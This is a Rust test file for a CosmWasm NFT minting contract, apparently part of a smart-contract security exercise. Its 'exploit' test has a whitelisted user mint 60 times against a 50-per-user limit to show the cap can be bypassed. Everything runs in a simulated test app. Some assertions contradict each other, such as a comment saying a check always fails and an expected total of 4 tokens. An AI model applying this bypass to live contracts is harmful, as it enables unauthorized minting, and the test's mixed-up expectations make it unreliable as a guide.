#[cfg(test)]
mod tests {
    use crate::{
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::{Config, Whitelist, MintedNFT},
    };
    use cosmwasm_std::{Addr, Empty};

    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    use crate:: integration_tests::tests::{USER2, USER1, USER3, proper_instantiate};
    pub const MINT_PER_USER: u64 = 50;

    #[test]
    fn exploit(){
        let (mut app, contract_addr) = proper_instantiate(MINT_PER_USER);

        // query config
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();

        // query whitelisted users
        let whitelist: Whitelist = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
            .unwrap();

        assert!(whitelist.users.contains(&USER1.to_owned()));
        assert!(whitelist.users.contains(&USER2.to_owned()));
        assert!(whitelist.users.contains(&USER3.to_owned()));

        let user4 = "user4";

        // mint to non-whitelisted user
        app.execute_contract(
            Addr::unchecked(user4),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // mint to whitelisted user until max limit
        assert_eq!(config.mint_per_user, MINT_PER_USER);

        for i in 0..60 {
            app.execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::Mint {},
                &[],
            )
            .unwrap();
            
        }
        // query minted nfts
        let minted_nfts : Vec<MintedNFT> = app.wrap().query_wasm_smart(contract_addr.clone(), &QueryMsg::MintPerUser { user: USER1.to_owned(), limit: None }).unwrap();

        // here if not instantiated correctly (will always fail because minted_nfts vector returned from the query will always return 10 elements because of limits.)
        assert_eq!(minted_nfts.len(), MINT_PER_USER as usize);

        // other users can mint freely
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // ensure total tokens increases
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();

        assert_eq!(config.total_tokens, 4);
    }
    
}